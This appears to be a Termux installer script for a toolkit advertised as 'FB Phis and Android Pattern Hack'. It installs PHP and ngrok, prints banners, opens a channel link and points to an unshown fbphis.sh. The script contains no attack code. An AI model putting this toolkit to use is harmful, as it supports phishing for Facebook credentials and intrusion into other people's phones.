clear
echo -e "\e[96m----------------- SDMH-Hacking-TV 2021-------------\e[0m";
echo -e "\e[95m--------------- Facebook-SDMH-Hacking-TV ----------\e[0m";
echo -e "\e[93m----------- FB Phis and Android Pattern Hack ------\e[0m";
echo ""
echo -e "\e[94m******** WELCOME *********\e[0m";
echo ""
echo ""
pkg update
pkg upgrade
pkg install php
apt install cowsay
apt-get install ruby
pkg install lolcat
gem install lolcat
apt install toilet
cd source
chmod +x *
unzip ngrok-stable-linux-arm.zip
chmod +x *
cp -r ngrok $HOME
echo "Now run bash fbphis.sh " | lolcat
echo ""
echo ""
clear
#! /data/data/com.termux/files/usr/bin/bash
clear
echo "                 ░██████╗██████╗░███╗░░░███╗██╗░░██╗"
echo "                 ██╔════╝██╔══██╗████╗░████║██║░░██║"
echo "                 ╚█████╗░██║░░██║██╔████╔██║███████║"
echo "                 ░╚═══██╗██║░░██║██║╚██╔╝██║██╔══██║"
echo "                 ██████╔╝██████╔╝██║░╚═╝░██║██║░░██║"
echo "                 ╚═════╝░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝"
echo "        _____________________________________________________"
echo "        ██╗░░██╗░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░██████╗░"
echo "        ██║░░██║██╔══██╗██╔══██╗██║░██╔╝██║████╗░██║██╔════╝░"
echo "        ███████║███████║██║░░╚═╝█████═╝░██║██╔██╗██║██║░░██╗░"
echo "        ██╔══██║██╔══██║██║░░██╗██╔═██╗░██║██║╚████║██║░░╚██╗"
echo "        ██║░░██║██║░░██║╚█████╔╝██║░╚██╗██║██║░╚███║╚██████╔╝"
echo "        ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░"
echo "                        ████████╗██╗░░░██╗"
echo "                        ╚══██╔══╝██║░░░██║"
echo "                        ░░░██║░░░╚██╗░██╔╝"
echo "                        ░░░██║░░░░╚████╔╝░"
echo "                        ░░░██║░░░░░╚██╔╝░░"
echo "                        ░░░╚═╝░░░░░░╚═╝░░░"
echo "                             WELCOME"
echo "              SDMH-Hacking-TV       Just Hacking-Tools"

echo                                                        
  read -p "Use this tool for educational purpose only press enter to continue " Enter
echo

#!/bin/bash
#installation
clear
echo ""
echo ""
echo " SUBSCRIBE MY CHANNEL 🔔 " | lolcat
xdg-open https://syr.us/iiW
echo ""
echo "Now run bash fbphis.sh " | lolcat
echo ""
echo ""
